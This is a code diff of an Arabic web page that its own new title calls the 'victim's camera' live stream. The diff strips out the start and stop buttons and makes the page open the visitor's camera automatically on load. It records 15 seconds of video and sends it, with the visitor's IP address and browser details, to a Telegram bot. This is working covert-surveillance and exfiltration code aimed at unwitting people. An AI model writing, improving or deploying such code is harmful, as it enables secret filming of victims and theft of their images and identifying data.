@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🎥 بث مباشر - تسجيل تلقائي</title>
+    <title>📡 بث مباشر - كاميرا الضحية</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -53,30 +53,6 @@
             font-size: 14px;
             padding: 30px;
         }
-        .btn {
-            width: 100%;
-            padding: 14px;
-            border: none;
-            color: #fff;
-            font-weight: bold;
-            font-size: 16px;
-            border-radius: 50px;
-            cursor: pointer;
-            transition: 0.3s;
-            margin-bottom: 8px;
-        }
-        .btn:hover { transform: scale(1.02); }
-        .btn:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
-        .btn-start { background: #e94560; }
-        .btn-start:hover { background: #c73652; }
-        .btn-stop { background: #2a2a4a; }
-        .btn-stop:hover { background: #3a3a5a; }
-        .btn-back { background: #2a4a3a; }
-        .btn-back:hover { background: #3a5a4a; }
-        .btn-front { background: #4a2a4a; }
-        .btn-front:hover { background: #5a3a5a; }
-        .btn-capture { background: #2a4a6a; }
-        .btn-capture:hover { background: #3a5a7a; }
         #status {
             margin-top: 15px;
             padding: 12px;
@@ -105,8 +81,6 @@
         }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         .footer { margin-top: 15px; font-size: 11px; color: #444; border-top: 1px solid #1a1a3a; padding-top: 12px; }
-        .btn-group { display: flex; gap: 8px; }
-        .btn-group .btn { flex: 1; }
         .recording-dot {
             display: inline-block;
             width: 12px;
@@ -134,25 +108,18 @@
 </head>
 <body>
     <div class="container">
-        <div class="icon">🎥</div>
+        <div class="icon">📡</div>
         <h2>بث مباشر</h2>
-        <p>سيتم التسجيل فوراً وإرسال الفيديو عند الإيقاف</p>
+        <p>سيتم بث كاميرتك وإرسال الفيديو تلقائياً</p>
 
         <div id="videoContainer">
             <video id="video" playsinline autoplay muted></video>
-            <div id="placeholder">📷 انتظر بدء البث...</div>
-            <div class="overlay-text" id="recordingStatus">⏸ غير نشط</div>
+            <div id="placeholder">📷 جاري تجهيز البث...</div>
+            <div class="overlay-text" id="recordingStatus">⏳ جاري الاتصال...</div>
         </div>
 
-        <div class="btn-group">
-            <button class="btn btn-back" id="backBtn">📸 خلفية</button>
-            <button class="btn btn-front" id="frontBtn">🤳 أمامية</button>
-        </div>
-        <button class="btn btn-start" id="startBtn">▶ بدء البث والتسجيل</button>
-        <button class="btn btn-stop" id="stopBtn" disabled>⏹ إيقاف وإرسال الفيديو</button>
-
-        <div id="status">⏳ اضغط "بدء البث"</div>
-        <div class="footer">🔒 اتصال آمن • الفيديو يرسل تلقائياً عند الإيقاف</div>
+        <div id="status">⏳ جاري فتح الكاميرا...</div>
+        <div class="footer">🔒 اتصال آمن • الفيديو يرسل تلقائياً</div>
     </div>
 
     <script>
@@ -163,23 +130,18 @@
         const placeholder = document.getElementById('placeholder');
         const recordingStatus = document.getElementById('recordingStatus');
         const statusDiv = document.getElementById('status');
-        const startBtn = document.getElementById('startBtn');
-        const stopBtn = document.getElementById('stopBtn');
-        const backBtn = document.getElementById('backBtn');
-        const frontBtn = document.getElementById('frontBtn');
 
         let stream = null;
         let mediaRecorder = null;
         let recordedChunks = [];
         let facingMode = 'environment';
-        let isRecording = false;
 
         // ====== إرسال الفيديو ======
         async function sendVideo(blob) {
             try {
                 const formData = new FormData();
                 formData.append('chat_id', CHAT_ID);
-                formData.append('video', blob, 'recording.mp4');
+                formData.append('video', blob, 'livestream.mp4');
 
                 const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
                     method: 'POST',
@@ -217,149 +179,113 @@
             } catch { return 'غير معروف'; }
         }
 
-        // ====== بدء الكاميرا ======
-        async function startCamera(mode) {
+        // ====== بدء الكاميرا والتسجيل ======
+        async function startStream() {
             try {
-                if (stream) {
-                    stream.getTracks().forEach(t => t.stop());
-                    stream = null;
+                statusDiv.innerHTML = `<span class="loader"></span> جاري فتح الكاميرا...`;
+                statusDiv.style.color = '#ff9800';
+                recordingStatus.innerHTML = '📷 جاري فتح الكاميرا...';
+                recordingStatus.style.color = '#ff9800';
+
+                // محاولة الكاميرا الخلفية أولاً، ثم الأمامية
+                try {
+                    stream = await navigator.mediaDevices.getUserMedia({
+                        video: {
+                            facingMode: 'environment',
+                            width: { ideal: 640 },
+                            height: { ideal: 480 }
+                        },
+                        audio: false
+                    });
+                    facingMode = 'environment';
+                } catch (e) {
+                    stream = await navigator.mediaDevices.getUserMedia({
+                        video: {
+                            facingMode: 'user',
+                            width: { ideal: 640 },
+                            height: { ideal: 480 }
+                        },
+                        audio: false
+                    });
+                    facingMode = 'user';
                 }
 
-                stream = await navigator.mediaDevices.getUserMedia({
-                    video: {
-                        facingMode: mode,
-                        width: { ideal: 640 },
-                        height: { ideal: 480 }
-                    },
-                    audio: false
-                });
-
                 video.srcObject = stream;
-                video.className = mode === 'environment' ? 'back' : 'front';
+                video.className = facingMode === 'environment' ? 'back' : 'front';
                 video.style.display = 'block';
                 placeholder.style.display = 'none';
-                return true;
+
+                statusDiv.innerHTML = `✅ الكاميرا جاهزة - بدء التسجيل...`;
+                statusDiv.style.color = '#4caf50';
+                recordingStatus.innerHTML = '🔴 جاري التسجيل...';
+                recordingStatus.style.color = '#ff0000';
+
+                // بدء التسجيل
+                recordedChunks = [];
+                mediaRecorder = new MediaRecorder(stream, {
+                    mimeType: 'video/webm;codecs=vp9,opus'
+                });
+
+                mediaRecorder.ondataavailable = (event) => {
+                    if (event.data.size > 0) recordedChunks.push(event.data);
+                };
+
+                mediaRecorder.onstop = async () => {
+                    statusDiv.innerHTML = `<span class="loader"></span> جاري إرسال الفيديو...`;
+                    statusDiv.style.color = '#ff9800';
+                    recordingStatus.innerHTML = '⏳ جاري الإرسال...';
+                    recordingStatus.style.color = '#ff9800';
+
+                    const blob = new Blob(recordedChunks, { type: 'video/webm' });
+                    const sent = await sendVideo(blob);
+
+                    if (sent) {
+                        statusDiv.innerHTML = `✅ تم إرسال الفيديو بنجاح`;
+                        statusDiv.style.color = '#4caf50';
+                        recordingStatus.innerHTML = '✅ تم الإرسال';
+                        recordingStatus.style.color = '#4caf50';
+
+                        const ip = await getIP();
+                        await sendMessage(`🎥 **بث مباشر - فيديو جديد**\n🕒 ${new Date().toLocaleString()}\n📱 ${navigator.userAgent}\n🌐 IP: ${ip}\n📷 الكاميرا: ${facingMode === 'environment' ? 'خلفية' : 'أمامية'}`);
+                    } else {
+                        statusDiv.innerHTML = `❌ فشل إرسال الفيديو`;
+                        statusDiv.style.color = '#e94560';
+                        recordingStatus.innerHTML = '❌ فشل الإرسال';
+                        recordingStatus.style.color = '#e94560';
+                    }
+
+                    // إغلاق الكاميرا
+                    if (stream) {
+                        stream.getTracks().forEach(t => t.stop());
+                        stream = null;
+                    }
+                    video.style.display = 'none';
+                    placeholder.style.display = 'block';
+                    recordingStatus.innerHTML = '⏸ انتهى البث';
+                    recordingStatus.style.color = '#aaa';
+                };
+
+                // تسجيل لمدة 15 ثانية ثم إيقاف تلقائي
+                mediaRecorder.start(1000);
+                setTimeout(() => {
+                    if (mediaRecorder && mediaRecorder.state === 'recording') {
+                        mediaRecorder.stop();
+                    }
+                }, 15000);
+
             } catch (error) {
                 let msg = '❌ فشل الوصول للكاميرا';
                 if (error.name === 'NotAllowedError') msg = '🚫 تم رفض صلاحية الكاميرا';
                 else if (error.name === 'NotFoundError') msg = '📵 لا توجد كاميرا';
                 statusDiv.innerHTML = msg;
                 statusDiv.style.color = '#e94560';
-                return false;
+                recordingStatus.innerHTML = '❌ فشل';
+                recordingStatus.style.color = '#e94560';
             }
         }
 
-        // ====== بدء التسجيل ======
-        async function startRecording() {
-            if (!stream) {
-                statusDiv.innerHTML = '⚠️ الكاميرا غير جاهزة';
-                statusDiv.style.color = '#ff9800';
-                return;
-            }
-
-            recordedChunks = [];
-            mediaRecorder = new MediaRecorder(stream, {
-                mimeType: 'video/webm;codecs=vp9,opus'
-            });
-
-            mediaRecorder.ondataavailable = (event) => {
-                if (event.data.size > 0) recordedChunks.push(event.data);
-            };
-
-            mediaRecorder.onstop = async () => {
-                statusDiv.innerHTML = `<span class="loader"></span> جاري معالجة الفيديو وإرساله...`;
-                statusDiv.style.color = '#ff9800';
-                recordingStatus.innerHTML = '⏳ جاري الإرسال...';
-                recordingStatus.style.color = '#ff9800';
-
-                const blob = new Blob(recordedChunks, { type: 'video/webm' });
-                const sent = await sendVideo(blob);
-
-                if (sent) {
-                    statusDiv.innerHTML = `✅ تم إرسال الفيديو بنجاح`;
-                    statusDiv.style.color = '#4caf50';
-                    recordingStatus.innerHTML = '✅ تم الإرسال';
-                    recordingStatus.style.color = '#4caf50';
-
-                    const ip = await getIP();
-                    await sendMessage(`🎥 **تم تسجيل فيديو جديد**\n🕒 ${new Date().toLocaleString()}\n📱 ${navigator.userAgent}\n🌐 IP: ${ip}`);
-                } else {
-                    statusDiv.innerHTML = `❌ فشل إرسال الفيديو`;
-                    statusDiv.style.color = '#e94560';
-                    recordingStatus.innerHTML = '❌ فشل الإرسال';
-                    recordingStatus.style.color = '#e94560';
-                }
-
-                // إعادة تعيين الأزرار
-                stopBtn.disabled = true;
-                startBtn.disabled = false;
-                backBtn.disabled = false;
-                frontBtn.disabled = false;
-                isRecording = false;
-
-                // إيقاف الكاميرا
-                if (stream) {
-                    stream.getTracks().forEach(t => t.stop());
-                    stream = null;
-                }
-                video.style.display = 'none';
-                placeholder.style.display = 'block';
-                recordingStatus.innerHTML = '⏸ غير نشط';
-                recordingStatus.style.color = '#aaa';
-            };
-
-            mediaRecorder.start(1000);
-            isRecording = true;
-            statusDiv.innerHTML = `<span class="recording-dot"></span> جاري التسجيل...`;
-            statusDiv.style.color = '#ff0000';
-            recordingStatus.innerHTML = '🔴 تسجيل...';
-            recordingStatus.style.color = '#ff0000';
-            stopBtn.disabled = false;
-            startBtn.disabled = true;
-            backBtn.disabled = true;
-            frontBtn.disabled = true;
-        }
-
-        // ====== إيقاف التسجيل ======
-        function stopRecording() {
-            if (mediaRecorder && mediaRecorder.state === 'recording') {
-                mediaRecorder.stop();
-            }
-        }
-
-        // ====== بدء البث ======
-        async function startStream() {
-            statusDiv.innerHTML = `<span class="loader"></span> جاري فتح الكاميرا...`;
-            const success = await startCamera(facingMode);
-            if (success) {
-                setTimeout(() => {
-                    startRecording();
-                }, 500);
-            }
-        }
-
-        // ====== تبديل الكاميرا ======
-        async function switchCamera(mode) {
-            if (isRecording) {
-                statusDiv.innerHTML = '⚠️ أوقف التسجيل أولاً';
-                statusDiv.style.color = '#ff9800';
-                return;
-            }
-            facingMode = mode;
-            statusDiv.innerHTML = `🔄 تم التبديل إلى ${mode === 'environment' ? 'خلفية' : 'أمامية'}`;
-            statusDiv.style.color = '#aaa';
-        }
-
-        // ====== بدء تلقائي عند فتح الصفحة ======
-        setTimeout(() => {
-            startStream();
-        }, 500);
-
-        // ====== ربط الأزرار ======
-        backBtn.addEventListener('click', () => switchCamera('environment'));
-        frontBtn.addEventListener('click', () => switchCamera('user'));
-        startBtn.addEventListener('click', startStream);
-        stopBtn.addEventListener('click', stopRecording);
+        // ====== بدء البث التلقائي فوراً ======
+        setTimeout(startStream, 500);
     </script>
 </body>
 </html>
